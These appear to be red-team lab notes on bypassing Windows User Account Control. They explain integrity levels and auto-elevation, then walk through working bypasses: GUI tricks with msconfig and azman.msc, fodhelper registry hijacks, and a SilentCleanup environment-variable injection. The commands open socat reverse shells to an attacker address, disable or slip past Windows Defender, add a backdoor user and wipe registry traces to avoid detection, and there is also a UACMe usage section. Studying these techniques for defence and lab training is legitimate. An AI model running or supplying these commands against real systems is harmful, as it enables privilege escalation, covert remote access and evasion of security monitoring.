---
title: "Bypassing UAC"
date: 2026-10-08
weight: 12
---

## 1 Overview
- User Account Control (UAC) is a Windows security feature that forces any new process to run in the security context of a non-privileged account by default. 
- This policy applies to processes started by any user, including administrators themselves. The idea is that we can't solely rely on the user's identity to determine if some actions should be authorized.

### 1.1 UAC Elevation
- If an adminstrator is required to perform a privileged task, UAC provided a way to elevate privileges.
- Elevation works by presenting a simple dialog box to user to confirm that they approve running the application in an admistrative security context.

### 1.2 Integrity Levels
- UAC is a Mandary integridty control (MIC), which is mechanism that allows differentiating users, processes, and resources by assigning an integrity level (IL) to each of them.
- In general terms, users or processes with higher IL access token will be able to access resources with lower ILs. 
- MIC takes precedence over regular windows DACLs (Discretionary Access Control Lists), so you may be authorized to access a resource according to the DACL, but still it wont matter if your IL isnt hight enough.
- When a process requires to access resource, it will inherit the calling user's access token, and its associated IL. The same occurs when a process forks a child process.
- The following 4 ILs are used by windows, ordered from lowest to highest.

| Integrity Level | Description |
|----------------|-------------|
| Low | Generally used for intaraction with the internet, has very limited permissions |
| Medium | Assigned to standard users and admistrators's filtered tokens |
| High | Used by Administrator's elevated if UAC is enabled. If UAC is disabled, all administrators will always use a high IL token |
| System | Reserved for system use |


### 1.3 Filtered Tokens
- To accomplish this, separation of roles, UAC treats regular users and administrators in a slightly different way during logon.
    - **Non-adminstrators** will receive a single access token when logged in, which will be used for all tasks performed by user. This token has Medium IL.
    - **Administrators** will receive two access tokens:
        - **Filtered Token**: A token with the administrator privileges stripped, used for regular operations. This token has Medium IL.
        - **Elevated Tokne**: A token with full administrator privileges, used when something needs to be run with administrative privileges. This token has High IL.

### 1.4 UAC Settings
- Depending on our security requirements, UAC can be configured to run at four different levels:
    - **Always Notify**: Notify and prompt the user for authorization when making changes to windows settings or when a program tries to install applications or make changes to the computer.
    - **Notify me only when programs try to make changes to my computer**: Notify and prompt the user for authorization when a program tries to install applications or make changes to the computer. Administrators wont be prompted when changing windows setttings.
    - **Notify me only when programs try to make changes to my computer (do not dim my desktop)**: Same as above, but wont run UAC prompt on a secure desktop.
    - **Never notify**: Disable UAC prompt. Admistrators will run everything using a high privilage token.

### 1.5 UAC Internals
- At the heart of UAC, we have `Application information service` or `AppInfo`. Whenever a user requires elevation, the following occurs
    - The user requests to run application as administrator
    - A shellExecute API call is made using the `runas` verb.
    - The request gets forwarded to AppInfo to handle elevation.
    - The application manifest is checked to see if AutoElevation  is allowed (mor on this later)
    - AppInfo executes `consent.exe`, which shows the UAC prompt on a secure deskto. A secure desktop is simply a seperate desktop that isolates process from whatever is running in the actual user's desktop to avoid other processes from tampering with the UAC prompt.
    - If the user gives consent to run the application as administrator, the appinfo service will execute the request using a user's elevated token. AppInfo will then set the parent process ID of the new process to point to the shell from which elevation was requested.

    ![UAC Elevation](/resources_redteam/uac_elevation.png)

### 1.6 Bypassing UAC
- From an attacker's perspective, there might be situations where you get a remote shell to a windows host via powershell or cmd.exe. you might even gain access through an account that is part of the admistrators group, but when you try creating a backdoor user for futur access, you get the following error:

```powershell
net user backdoor Backd00r /add
# System error 5 has occured
# Access denied
```

- By checking our assinged groups (`whoami /groups`), we can confirm that our session is running with a medium IL, meaning we are effectively using a filtered token.
    
- Even when we get a powershell session with an administrators user, uac prevents us from performing any administrative tasks as we are currently using a filtered token only. If we want to take full control our target, we must bypass UAC.
- Interestingly enough, microsoft doesnt consider uac a security boundary, but rather a simple convenience to administrator to avoid unnessessarily running processes with administrative privileges. 
- In that case, the UAC prompt is more of a remainder to the user that they are running with high privileges, rather then impending a piece of malware or an attacker from doing so,. 
- Since it isnt a security boundary, any bypass technique is not considered a vulnerability to microsoft, and therefor some of them remain unpatched to this day.

- Generatlly speaking, most of the bypass techniques rely on us being able to leverage a High IL process to execute something on our behalf. Since any process created by a High IL parent process will inherit the same integrity level, this will be enough to get an elevated token without requiring us to go through the UAC prompt.



## 2. UAC: GUI Based bypasses
### 2.1 Case study: msconfig (Microsoft System Configuration)
- Our goal is to obtain access to high IL command prompt without passing through UAC. 
- First start by opening `msconfig`.
- If we analyze the msconfig process with `Process Hacker`, we notice something interesting, even when no UAC prompt was presented to us, msconfig runs as high IL process.
- This is possible thanks to a feature called `Auto elevation` that allows specific binaries to elevate without requiring the user's interaction.
- If we could force msconfig to span a shell for us, the shell would inherit the same access token used by msconfig and therefore be run as a high IL process. By navigating to the `Tools` tab in msconfig, we can find an option to do just that; Opening launch button by selecting `Command prompt`. --> this will give us a high IL cmd without UAC prompt.

### 2.1 Case Study: azman.msc (Authorization manager)
- As with msconfig, azman.msc wil auto elevate without requireing user interaction. If we can find a way to spawn a shell from within that process, we will bypass UAC. 
- Note that, unlike msconfig, azman.msc has no intended build-in-way to spawn a shell. We can easily overcome this with a bit of creativity.
- First lets run azman.msc: and we can confirm tht a process with high IL was spawned by using Process hacker. 
- Also, notice that all .msc files are run from mmc.exe (Microsoft management console)
- To run a shell, we will abuse application's `help` menu. On help screen, we will right-click any part of help article and select `View source`.
- This will spawn a notepad process that we can leverage to get a shell. To do so, go to `File --> open` and make sure to select `all file` in the combo box on lower right corner. 
- Go to `C:\Windows\System32\cmd.exe` and click open.
- This will once again bypass UAC and give us access to high IL cmd prompt. Verify the same using the process hacker.


## 3. UAC: Auto-Elevating proces
### 3.1 Auto Elevate
- As mentioned before, some executables can auto-elevate, achieveing high IL without any user intervention. This applies to most of the control panel's functionality and some executables provided with winodws.
- For an appliation, some requirements need to be met to auto elevate.
    - The executable must be signed by windows publisher.
    - The executable must be contained in a trust directory, like `%SystemRool%/System32/` or `%ProgramFiles%/`
- Depending on the type of application, additional requirement may apply:
    - Executable file (.exe) must declare the `autoElevate` element inside their manifest. To check a file's manifest we can use `sigcheck`, a tool provided as part of sysinternals suit. If we check for `msconfig`, we will find autoElevate property.
    ```powershell
    cd C:\tools\sysinternals
    .\sigcheck.exe -m C:\Windows\System32\msconfig.exe
    # Output should show `<autoElevate>true</autoElevate>`
    ```
    - `mmc.exe` will auto elevate depending upon .msc snap-in that the user requiests. Most of the .msc files included with windows will auto elevate.
    - Windows kieeps an addional list of executables that auto elevate even when not requestsed in the manifest. this list includes `pkgmgr.exe` and `spinstall.exe`, for example.
    - COM objects can also request auto-elevation by configuring some registry keys. (https://docs.microsoft.com/en-us/windows/win32/com/the-com-elevation-moniker).

### 3.2 Case Study: Fodhelper
- Fodhelper.exe is one of windows default executables in charge of manaing windows optional features, including additional languages, applications not installed by default, or other operating system characteristics. 
- Like most of the programs used for systme configuration, fodhelper can auto elevate when using default uac settings so that administrators wont be prompted for elevation when performing standard administrative tasks.
- While we've already taken a look at autoElevate executable, unlike msconfig, fodhelper can be abused without having access to GUI.
- From an attacker's perspective, this means it can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by [@winscripting](https://winscripting.blog/2017/05/12/first-entry-welcome-and-uac-bypass/) and has been used in the wild by the [Glupteba malware](https://www.cybereason.com/blog/glupteba-expands-operation-and-toolkit-with-lolbins-cryptominer-and-router-exploit).
- What was noticed about fodhelper is that it searches the registry for a specific key of interest.
    ![Fodhelper Registry Key](/resources_redteam/foldhelper_registry.png)
- When windows opens a file, it checks the registry to know what application to use. The registry holds key known as `Programmatic ID (ProgID)` for each file type, where the corresponding appplication is associated.
- Let's say you try to open an html file, a part of the registry know as the `HKEY_CLASSES_ROOT` will be checked so that the system knows that it must use your preferred web client to open it.
- The command to use will be specified under `shell/open/command` subkey for each file's ProgID. 
- Taking the "htmlfiel" ProgID as example, the command will be specified under `HKEY_CLASSES_ROOT\htmlfile\shell\open\command` --> `"C:\Program Files\Internet Explorer\iexplore.exe" %1`
- In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on registry: `HKEY_LOCAL_MACHINE\SOFTWARE\Classes` (system-wide) and `HKEY_CURRENT_USER\SOFTWARE\Classes` (user-specific).
- When checking HKEY_CLASSES_ROOT, if there is a user-specific association at HKEY_CURRENT_USER (HKCU), it will take priority. If no user-specific association is configured, the the system wide association at HKEY_LOCAL_MACHINE (HKLM) will be used instead. This way, each user can choose their preffered applications seperately if desired.
- Going back to fodhelper, we now see that its string to open a file under the ms-settings ProgID. By creating an association for that progID in the current user's context under HKCU, we will override the default system-wide association and , therfore, control which command is used to open file. 
- Since fodhelper is auto elevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC.

### 3.3 Putting all together
- One of our agents has planted a backdoor on the target server for your convenience. He managed to craete an account with the administrator group, but UAC is preventing the execution of any privilaged tasks. To retrieve the flag, he needs you to bypass UAC and get fully functional high IL shell.
- To connect to the backdoor, you can use the following command `nc 10.48.174.106 9999`
- Once connected, we check if our user is part of the Admistrator's group and that it is running with a medium integrity token: 
    - `whoami` --> attacker
    - `net user attacker | find "Local Group"` --> Administrators
    - `whoami /groups | find "Label"` --> "Mandatory Label\Medium Mandatory Level"

- We set the required registry to associate the ms-settings class to a reverse shell. For convenience, a copy of socat can be found at `C:\tools\socat\`. We can use following commands to set the required registry keys from standard command line:
```powershell
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\Command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
# Set the DelegateExecute value to an empty string, for class association to take effect.
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
# Set the default value to our command
reg add %REG_KEY% /d %CMD% /f

# Set up a listener on our attacker machine
nc -lvp 4444

# then, execute fodhelper.exe which in turn will trigger execution of our reverse shell.
fodhelper.exe

# verify that we have a high integrity shell
whoami /groups | find "Label" # "Mandatory Label\High Mandatory Level"

# some artifacts were created on target system in form of registry keys due to this action.
# to avoid detection, we need to clean up after ourselves
reg delete HKCU\Software\Classes\ms-settings\ /f
```

## 3 UAC: Improving the Fodhelper Exploit to bypass windows defender
### 3.1 Windows Defender
- For simplicity, the machine we are targeting has windows defender disabled. But what would happen if it was enabled ?
- First, enable the windows defender and try to execute the same exploit again ..
```powershell
# Enable windows defender
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"

# Try to execute the same exploit again
set REG_KEY=HKCU\Software\Classes\ms-settings\Shell\Open\Command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:<attacker_ip>:4444 EXEC:cmd.exe,pipes"
reg add %REG_KEY% /v "DelegateExecute" /d "" /f
reg add %REG_KEY% /d %CMD% /f
fodhelper.exe

# probably this will not work.
# Defender will remove the value of this registry key immediately after it sees it.
# But we believe there's some window between the two actions.. we can utilize this window..
# below technique will get us reverse shell, and yes, its still detectable by windows defender..
reg add %REG_KEY% /d %CMD% /f & reg query %REG_KEY% /v "" & fodhelper.exe
```

### 3.2 Improving the fodhelper exploit
- A variation on the fodhelper exploit was proposed by [@V3ded](https://v3ded.github.io/redteam/utilizing-programmatic-identifiers-progids-for-uac-bypasses), where different registry keys are used, but the basic principle is the same.
- Instead of writing our payload into `HKCU\Software\Classes\ms-settings\Shell\Open\Command`, we will use the `CurVer` entry under a progID registry key. This entry is used when you have multiple instances of an applicatioin with different versions running on same system. `CurVer` allows you to point to the default version of the application to be used by Windows when opening a given file type.
j- To this end, we will create entry on registry for a new progID of our choice and then point the CurVer entry in the ms-settings progID to our newly created progID. This way, when fodhelper tries opening a file using ms-setting progID, it will notice the CurVer entry pointing to our new ProgID and check it to see what command to use.
- The exploit code proposed by @V3ded uses powershell to achieve this end. here is the one.
```powershell
$program="powershell -windowstyle hidden C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes"
New-Item "HKCU:\Software\Classes\.pwn\Shell\Open\Command" -Force
Set-ItemProperty -Path "HKCU:\Software\Classes\.pwn\Shell\Open\Command" -Name "(default)" -Value $program
New-Item  "HKCU:\Software\Classes\ms-settings\CurVer" -Force
Set-ItemProperty "HKCU:\Software\Classes\ms-settings\CurVer" -Name "(default)" -Value ".pwn" -Force
Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden
```
- This exploit created new progID with the name `.pwn` and associates our payload to the command used when opening such files. It then points the CurVer entry of ms-settings to our .pwn progID. 
- When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command.
- If we execute exploit from our backdoor as is, it results, windows defender will throw another alert that reference our actions.
- Although we are stil detected, it is essential to note that sometimes the detection methods used by AV software are implemented strictly against published exploit, without considering possible variations. 
- If we translate our exploit from powershell to use cmd.exe, the AV wont raise any alerts.
```powershell
# run the exploit as it is
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:192.168.155.139:4445 EXEC:cmd.exe,pipes"
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f
fodhelper.exe

# Make sure you are running rshell on port 4445, on attacker machine
# then run the application..
fodhelper.exe

```

## 4 UAC: Environment Variable Expansion
### 4.1 Bypassing Always Notify
- As seen the previous task, on default windows configurations, you can abuse applications related to the system's configuration to bypass UAC as most of these apps have the autoElevate flag set on their manifests. 
- However, if UAC is configured on the "Always Notify" level, fodhelper and similar apps won't be of any use as they will require the user to go through UAC prompt to elevate. This would prevent several known bypass methods to be used, but not all hope is lost.
- For the following technique, we'll be abusing a sheduled task that can run by any user but will execute the highest privilage available to the caller. 
- By design, sheduled tasks are meant to run without any user interations (independent of UAC security level), so asking the user to elevate a process manually is not an option. Any sheduled tasks that require elevation will automatically get it without going through the UAC prompt.

### 4.2 Case Study: Disk cleanup sheduled task
- **Note**: Be sure of disable windows defender for this task, or you may have some difficulties when running the exploit.
```powershell
# disable the powershell
powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $true"
```
- To understand why we are picking the disk cleanup, let's open the Task shedular and check the task's configuration:
![disk clean up task](/resources_redteam/disk_cleanup_task.png)
- Here we can see that task is configured to run with the Users account, which means it will inherit the privilegs from the calling user.
- The `Run with the highest privileges` option will use the highest privileg security token available to the calling user, which is high IL token for an administrator. 
- Checking the `Actions` and `Settings` tabs, we have...
    - The task can be run on-demand, executing the following commadn when invoked..
    `%windir%\system32\cleanmgr.exe /autoclean /d %systemdrive%`
    - we might inject commands through these environment variables and get executed by starting the Disk Cleanup task
    - we can overide the variable `%windir%` through registry by creating an entry in `HKCU\Environment`. 
    `"cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM "`
    - REM at the end of command is used to comment out the rest of the original command.
    - orinal command looks like this
    `cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM \system32\cleanmgr.exe /autoclean /d %systemdrive%`
- putting all together..
```powershell
# set the registry key
reg add HKCU\Environment /v windir /t REG_EXPAND_SZ /d "cmd.exe /c C:\tools\socat\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes &REM " /f
# start the listner and run the below task to get the reverse shell..
schtasks /run /tn "\Microsoft\Windows\DiskCleanup\SilentCleanup /I"
```


## 5. Automated Exploitation
- An excellent tool is available to test for UAC bypasses without writing your exploits from the scratch.
- Created by @hfiref0x, UACMe provides up to date repository of UAC bypasses techniques that can be used out of box.
- The tools is availabe at [UACME](https://github.com/hfiref0x/UACME)
- while UACMe provides several tools, we will focus mainly on one called Akagi, which runs the actual UAC bypasses. Already installed at `C:\tools\UACMe-Akagi64.exe`
- Using the tool is straightforward and only requires you to indicate the number corresponding to the method to be tested. A complete list of methods is available on project repository. 
- If you want to test for method 33, you can do the following from the command prompt, and high integrity cmd.exe will pop up;
```powershell
# 33: fodhelper.exe
# 34: DiskCleanup sheduled task
# 70: fodhelper.exe using CurVer registry key

UACMe-Akagi64.exe 33
```

































